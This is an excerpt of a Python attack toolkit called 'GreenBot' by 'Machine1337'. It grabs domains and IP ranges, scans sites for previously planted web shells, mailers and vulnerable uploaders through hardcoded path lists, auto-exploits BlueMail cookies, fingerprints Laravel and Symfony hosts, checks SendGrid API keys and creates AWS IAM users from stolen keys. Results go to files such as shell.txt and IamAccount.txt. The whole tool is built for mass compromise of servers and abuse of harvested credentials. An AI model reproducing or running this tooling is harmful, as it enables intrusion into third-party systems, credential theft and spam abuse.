...
if os.path.exists("Machine1337"): 
    pass
else: 
    os.mkdir("Machine1337") 
...
def main():
    ...
    """
    logo = """                                                                                                                               
       {g}[{w}Channel : https://t.me/Machine1337{g}]{w}
       {g}GreenBot Tool By Machine1337 Decoded By @Machine1337{g}
   {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- {w}- {g}- 
   """
    option="""                                                                                                            
    |----------|
    | Grabbers |                                                                                                            
    |----------| 
   {g}[{w}1{g}] {w}Grabber Sites COM By Dates Updated Daily Result {g}
   {g}[{w}2{g}] {w}Grabber Sites By Domain + Country  {g}
   {g}[{w}3{g}] {w}Grabber Sites UK From Page {r}
   {g}[{w}4{g}] {w}Grabber Option 2 + Option Number 10 + Option Number 19  + Auto Check + Save Live & Good IPs {g}
   ...
   {g}[{w}8{g}] {w}Leakix Grabber With Query/Dork And API  {g}
    ...
    | IPS OPT  |
    |----------|
   {g}[{w}9{g}]  {w}Range IP From IPS List  {g}
   {g}[{w}10{g}] {w}Domain To IP  {g}
   {g}[{w}11{g}] {w}Option Number 9 + Option Number 10 Auto {g}
   {g}[{w}12{g}] {w}ASN IPs Grabber Asn Method To Get IPs  {g}
   {g}[{w}13{g}] {w}Generator Random IPS {g}
   {g}[{w}14{g}] {w}Remove Duplicate From List {g}

    |----------|
    |  SHELLS  |                                                                                                            
    |----------|
   {g}[{w}15{g}] {w}Shell/Mailer Finder  {g}
   {g}[{w}16{g}] {w}Shell Scaner  {g}

    |----------|
    | LARAVEL  |                                                                                                            
    |----------|
   {g}[{w}17{g}] {w}Auto Exploit Cookies BlueMail {g}
   {g}[{w}18{g}] {w}Auto Check Bluemail sites/ip  {g}
   {g}[{w}19{g}] {w}Auto Check Laravel + Apache Symfony + Wordpress site/ip {g}
   {g}[{w}20{g}] {w}Auto Filter Mailist Hotmail, Yahoo, Gmail {g}
   {g}[{w}21{g}] {w}Mass Check Sengrid Limit + Send Test In Your Mail {g}
   {g}[{w}22{g}] {w}Mass Change User+Pass Aws + Send In Your Mail {g}
   """
    ...
    if select == "1":
      ...
      #  except:
        ...
        print('033[32;1m Saved In 3.txt')
    elif select == "2":
        if os.path.exists("Machine1337"): pass
        else: 
            os.mkdir("Machine1337") 
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
        ...
        try:
            ...
            if '404 Not Found' in r:
                ...
                print("Saved Resultt ...")
                time.sleep(6)
                open( "Machine1337/" + negara + ".txt", "a" ).write( r + "\n" )
        ...
        for web in open(inputip).read().splitlines():
            ...
            try:
                ...
                if "Null" in r.text:
                    ...
                    open('Machine1337/exploit_cookies.txt', 'a').write(web + ' Cookies -> '+r.text + '')
            except:
                pass
    elif select == "18":
        os.system(["clear", "cls"][os.name == 'nt'])
            ...
            for webcek in inputlist.splitlines():
             ...
             #   try:
                ...
                if "authentication/login" in response.text: 
                    ...
                    open('Machine1337/bluemail-valid.txt', 'a').write(webcek + "\n")
                else: 
                    print(f"|{webcek}| -> |{Fore.RED}Not BlueMail{Style.RESET_ALL}|")
                    open('Machine1337/not-bluemail.txt', 'a').write(webcek + "\n")
            ...
            try:
                ...
                if "symfony/profiler/" in response.text or "symfony" in response.text: 
                    ...
                    if "symfony/profiler/" in response2.text or "symfony" in response2.text: 
                        ...
                        open('Machine1337/unknown-live.txt', 'a').write(webcek + "\n")
                ...
                for website in arrayweb:
                    ...
                    for result in s.find_all('font'):
                        ...
                        if findall('([A-Za-z0-9].co.uk)', result):
                            open('Machine1337/UK.txt', 'a').write(result+"\n")
        ...
        def domtoip(filewebs3):
            try:
                ...
                open('Machine1337/domain-to-ips.txt', 'a').write(hostn + "\n")
            except:
                pass
                    ...
                    if response.status_code == 200:
                        ...
                        if "laravel_session" in response.cookies: 
                            ...
                            if webcek not in tempatsampah:
                                tempatsampah.append(webcek)
                                print(f"|{webcek}| -> |{Fore.GREEN}UNKNOWN FRAMEWORK{Style.RESET_ALL}|")
                                open('Machine1337/live-ips.txt', 'a').write(webcek + "\n")
                            else:
                                print(f"|{webcek}|  -> |{Fore.RED}DUPLICATE IP{Style.RESET_ALL}|")
        ...
        try:
            ...
            if '404 Not Found' in r:
                ...
                print(r4)
                print("Saved Resultt ...")
                open( "Machine1337/" + negara + ".txt", "a" ).write( r4 + "\n" )
                if '404 Not Found' in r4:
                    os.system(["clear", "cls"][os.name == 'nt'])
                    print('MAYBE YOU INPUT WRONG COUNTRY / DOMAIN NAME PLEASE CHECK IT')
                ...
                open( "Machine1337/" + negara + ".txt", "a" ).write( r + "\n" )
            time.sleep(3)
            print(f"Already Saved In Machine1337/{negara}.txt")
        except:
            pass
        ...
        time.sleep(3)
        inputlist = open("Machine1337/" + negara + ".txt", 'r').read().split("\n")    
        if inputlist:
          #  try:
            with ThreadPoolExecutor(int(threadblue)) as zz:
                zz.map(cekblue, inputlist)
        ...
        def domtoip(filewebs3):
            try:
                ...
                pid = os.getpid()
                print(f"{Fore.WHITE}|{Fore.GREEN}SUCCES {pid}{Fore.WHITE}|{Style.RESET_ALL} |{filewebs4}|-|{Fore.BLUE}{hostn}{Style.RESET_ALL}|")
                open('Machine1337/domain-to-ips-option-11.txt', 'a').write(hostn + "\n")
        ...
        if filewebs3:
          #  try:
            with ThreadPoolExecutor(int(threaddom)) as zz:
                ...
                time.sleep(1.5)
                for ip in open('Machine1337/domain-to-ips-option-11.txt').read().splitlines():
      ...
      #  if sites:
        ...
        def grab2(tanggal,data):
            if data in open(f"Machine1337/{tanggal}.txt").read().splitlines():
                return
            open(f"Machine1337/{tanggal}.txt","a+").write(f"{data}\n")
        ...
        def grab3(tanggal,lastpage,y,m,d):
            ...
            print('n[#] Success > {} domain'.format(sum(1 for line in open(f'Machine1337/{tanggal}.txt', 'r'))))
        ...
        tanggal = f"{y}-{m}-{d}"
        if not os.path.exists("Machine1337"):
            os.makedirs("Machine1337")
        if not os.path.exists(f"Machine1337/{tanggal}.txt"):
            open(f"Machine1337/{tanggal}.txt","w").write("")
          ...
          #  try:
            ...
            for Yh in range(0, int(len(rather)) - 1):
                ...
                for IP in IPL:  
                    ...
                    open('Machine1337/UNCHECKED_ASN_IPS.txt', 'a', errors='ignore', encoding='utf-8').write(f"{IP}\n")
                    print(f"x1b[95m{IP}")
       ...
       # while True:
            ...
            for mail in mails: 
                if mail not in tmp:
                    ...
                    if is_email( mail, check_dns=True):
                        ...
                        open('Machine1337/mailist-vlistexv3.txt', 'a').write( mail+"\n" )
                    else:
        ...
        def SendgridCheck(apikey):
            try:
                ...
                with open("Machine1337/sendgridcheck-results.txt", "a") as x:
        ...
        def AwsUser(ACCESS_KEY, SECRET_KEY, REGION):
            try:
                ...
                simpan = open('Machine1337/IamAccount.txt', 'a')
        ...
        def finder(i):
            ...
            '87.php',
            '7yn.php',
            'wp-includes/ID3/bs.PhP7',
            'wp-includes/ID3/v3.PhP7',
            'wp-includes/ID3/v2.PhP7',
            'wp-includes/ID3/wp-diff.PhP7',
            'wp-includes/ID3/m.PhP7',
            'wp-includes/ID3/wwp.PhP7',
                ...
                for script in listaa:
                    ...
                    while True:
                        ...
                        if 'drwxr-xr-x' in req_first.text or '-rw-r--r--' in req_first.text or 'drwxr-x---' in req_first.text:
                            ...
                            with open('Machine1337/shell.txt', 'a') as (file):
                                file.write(url + "\n")
                                file.close()
                            break
                            ...
                            with open('Machine1337/uploader-shell.txt', 'a') as (gn):
                                gn.write(url + "\n")
                                gn.close()
                            break
                            ...
                            Good = Good + 1
                            print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.GREEN} Found Shell {Fore.WHITE}| {Fore.YELLOW}{url}')
                            with open('Machine1337/shell.txt', 'a') as (fox):
                                Good = Good + 1
                                fox.write(url + "\n")
                                fox.close()
                            break
                            ...
                            with open('Machine1337/mailer.txt', 'a') as (mailers):
                                mailers.write(url + "\n")
                                mailers.close()
                            break
                        else:
                            if 'method=post>Password:' in req_first.text or '<input type=password name=pass' in req_first.text:
                                ...
                                with open('Machine1337/user-pass.txt', 'a') as (pa):
                                    pa.write(url + "\n")
                                    pa.close()
                                break
                            else:
                                if 'name="uploader" id="uploader">' in req_first.text:
                                    ...
                                    with open('Machine1337/vuln-uploader.txt', 'a') as (fo):
                                        fo.write(url + "\n")
                                        fo.close()
                                    break
                                else:
        ...
        def run():
            ...
            '404.php',
            'sym.php',
            '.well-known/acme-challenge/v3.PhP7',
            '.well-known/acme-challenge/v2.PhP7',
            '.well-known/v2.PhP7',
            'v2.PhP7',
            'wp-confirm.php',
            '.well-known/v3.PhP7',
